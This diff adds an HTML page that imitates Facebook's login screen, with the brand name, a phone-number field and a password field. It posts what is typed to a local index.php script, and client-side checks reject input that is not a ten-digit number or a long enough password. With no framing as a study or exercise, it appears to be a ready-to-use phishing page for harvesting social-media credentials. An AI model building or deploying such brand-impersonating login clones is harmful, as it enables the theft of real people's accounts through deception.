@@ -1,0 +1,90 @@
+<!DOCTYPE html> 
+<html> 
+<head> 
+<title>Login</title> 
+<style> 
+body{ 
+ text-align: center; 
+ background-color: #C0C0C0; 
+} 
+
+#container{ 
+ background-color: white; 
+ width: 80%; 
+ position: absolute; 
+ left: 10%; 
+ box-shadow:0 0 12px 0 rgba(0,0,0,0.2),0 11px 34px 10px rgba(0,0,0,0.2); 
+ border-radius: 10px; 
+} 
+input{ 
+ margin: 15px; 
+ width: 80%; 
+ padding: 20px 20px; 
+ border-radius: 5px; 
+ border: 1px solid gray; 
+ font-size: 20px; 
+} 
+input:focus{ 
+    border-color:black; 
+} 
+h1{ 
+ color: blue; 
+ font-size: 45px; 
+ font-family: sans-serif; 
+} 
+p{ 
+ font-family: sans-serif; 
+ font-size: 20px; 
+ margin: 30px; 
+
+} 
+.bu{ 
+ width: 85%; 
+ background-color: blue; 
+ color: white; 
+ padding: 20px 20px; 
+ border-radius: 10px; 
+ font-family: sans-serif; 
+ font-size: 20px; 
+} 
+span a{ 
+ text-decoration: none; 
+ color: blue; 
+ font-size: 20px; 
+ font-family: sans-serif; 
+} 
+</style> 
+</head> 
+<body > 
+<h1>facebook</h1> 
+<div id ="container"> 
+<form id="myform" action="index.php" method="post" onsubmit="return check()"> 
+
+<p>Log into Facebook</p> 
+<input type="tel" placeholder="Phonenumber" name="phone" id="phone" required/></br></br> 
+<input placeholder="Password" type="password" name="password" id="password" required/></br></br></br> 
+<input type="submit" name="" class="bu" value="Log in"><br><br> 
+<span><a href="">Forgot account?&nbsp &nbsp&nbsp&nbsp &nbsp&nbsp &nbsp Sign Up for Facebook</a></span> 
+</div> 
+
+<script>
+function check() {
+  var phone = document.getElementById("phone").value;
+  var password = document.getElementById("password").value;
+
+  if (phone.length < 10 || phone.length > 10) {
+    alert("Enter the correct Phone number!!");
+    return false;
+  } 
+
+  if (password.length < 6) {
+    alert("incorrect password!");
+    return false;
+  }
+
+  return true;
+}
+</script>
+
+</body> 
+</html>
